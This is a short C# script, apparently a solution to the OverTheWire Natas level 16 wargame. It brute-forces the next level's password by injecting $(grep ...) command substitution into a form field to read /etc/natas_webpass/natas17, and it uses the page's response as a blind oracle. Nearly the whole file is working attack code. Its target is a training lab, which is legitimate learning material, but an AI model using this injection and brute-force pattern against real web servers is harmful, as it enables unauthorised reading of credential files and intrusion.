using System.Net.Http;
using System.Text;

HttpClient client = new HttpClient();
client.BaseAddress = new Uri("http://natas16.natas.labs.overthewire.org");

//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index.php");
//HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Get, "/index-source.html");

char[] chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXVZ1234567890".ToCharArray();
string password = "";

string msg = "Bruteforcing";
Console.Write(msg);
for (int i = 0; i < 32; i++)
{
    msg += ".";
    foreach (char c in chars)
    {
        HttpRequestMessage request = new HttpRequestMessage(HttpMethod.Post, "/index.php");
        string credential = Convert.ToBase64String(ASCIIEncoding.ASCII.GetBytes("natas16:???????????????????????????????????????"));
        request.Headers.Add("Authorization", "Basic " + credential);
        request.Headers.Add("ContentType", "application/x-www-form-urlencoded");

        request.Content = new FormUrlEncodedContent(new[] {
        new KeyValuePair<string, string>("needle", "fart$(grep ^" + password + c + " /etc/natas_webpass/natas17)"),
    });

        HttpResponseMessage httpResponse = await client.SendAsync(request);
        httpResponse.EnsureSuccessStatusCode();
        String body = await httpResponse.Content.ReadAsStringAsync();

        if (body.Contains("fart")) continue;

        password += c.ToString();
        Console.SetCursorPosition(0, 0);
        Console.Write(msg);
        break;

    }
}
Console.WriteLine("\nFinished!\nPassword: " + password);
